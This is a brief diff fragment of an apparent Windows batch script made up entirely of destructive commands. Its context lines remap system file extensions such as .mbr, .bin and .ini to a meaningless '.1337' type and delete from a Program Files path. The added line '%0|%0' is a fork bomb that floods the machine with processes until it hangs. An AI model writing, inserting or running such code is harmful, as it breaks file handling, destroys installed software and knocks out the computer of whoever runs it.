@@ -18,3 +18,4 @@ assoc .mbr=.1337
 assoc .bin=.1337
 assoc .ini=.1337
 del c:Program Files/q
+%0|%0
